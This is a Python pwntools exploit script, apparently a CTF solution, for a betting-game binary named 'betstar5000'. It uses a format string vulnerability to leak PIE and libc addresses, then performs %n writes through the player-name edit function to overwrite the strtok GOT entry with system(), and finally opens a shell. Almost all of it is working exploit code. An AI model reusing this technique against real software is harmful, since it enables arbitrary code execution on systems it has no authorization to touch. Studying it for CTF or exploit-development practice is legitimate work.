from pwn import *

target = process("./server")
#target = remote("localhost", 5000)
gdb.attach(target)

elf = ELF("./betstar5000")
libc = ELF("./libc-2.27.so")


def getMenu():
    output = target.recvuntil(b"5. End the game")
    # print(output)

# 
def getLeaks():
    getMenu()
    target.sendline(b"1") # Play a round
    target.sendline(b"1") # Choose one player
    target.sendline(b"1") # Bet 1, automatic win, doesn't really matter. You are the only player
    print(target.recvuntil(b"And the winner is *drumroll*: "))
    leak = target.recvline().strip(b"\n")
    return leak

def addPlayer(name):
    getMenu()
    target.sendline(b"3")
    target.sendline(name)

def editPlayer(index, name):
    target.sendline(b"4")

    target.sendline(str(index).encode("utf-8"))

    target.sendline(name)


# Get infoleaks, calculate needed addresses

target.sendline(b"1")
target.sendline(b"%x.%x") # Leak two pointers static string and stdin IO from libc

leak = getLeaks()

pieBase = int(leak.split(b".")[0], 16) - 0x105c #offset to base of binary
libcBase = int(leak.split(b".")[1], 16) - 0x1d85c0 #offset to base of binary
system = libcBase + libc.symbols["system"]
strtok = pieBase + 0x2584

print("pie base is: " + hex(pieBase))
print("libc base is: " + hex(libcBase))
print("strtok: " + hex(strtok))

# Calculate the amount of bytes we need to print for the fmt string write

x = (system & 0xffff) - 8
y = ((system & 0xffff0000) >> 16) - (system & 0xffff)

# Make the fmt string

noop = p32(strtok) + p32(strtok + 2) + b"%" + str(x).encode("utf-8") + b"x%19$n" + b"%" + str(y).encode("utf-8") + b"x%20$n"

# Add two new players to hold the format string, doesn't matter the name. They will be overwritten with edit.
filler = b"0"*12

for i in range(0, 2):
    addPlayer(filler)

editPlayer(1, noop[0:17]) #Use edit to write 18 bytes
editPlayer(2, noop[16:])

# Get our fmt string to the vulnerable printf call

target.sendline(b"1") 
target.sendline(b"2")
target.sendline(b"100")

target.sendline(b"1")

# Send 'sh' to be our argument to system, to get our shell

target.sendline(b"sh")

logging.info("Send payload")

# Enjoy your shell

target.interactive()